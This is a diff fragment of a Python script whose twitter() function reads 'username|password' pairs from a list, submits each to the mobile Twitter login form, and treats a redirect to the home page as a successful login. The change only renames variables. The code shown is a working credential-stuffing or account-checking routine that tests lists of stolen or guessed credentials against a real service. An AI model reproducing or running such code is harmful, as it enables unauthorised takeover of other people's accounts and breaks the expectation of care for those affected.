@@ -26,13 +26,13 @@ def twitter():
 	for a in password:
 		ab = a.strip()
 		ac = ab.split('|')
-		anj = ac[0]
-		anj2=ac[1]
+		reks1 = ac[0]
+		reks12=ac[1]
 		url = "https://mobile.twitter.com/login"
 		brows.open(url, timeout=10)
 		brows.select_form(nr=0)
-		brows.form['session[username_or_email]']=anj
-		brows.form['session[password]']=anj2
+		brows.form['session[username_or_email]']=reks1
+		brows.form['session[password]']=reks12
 		brows.method='POST'
 		submit=brows.submit()
 		if submit.geturl() == "https://mobile.twitter.com/home":
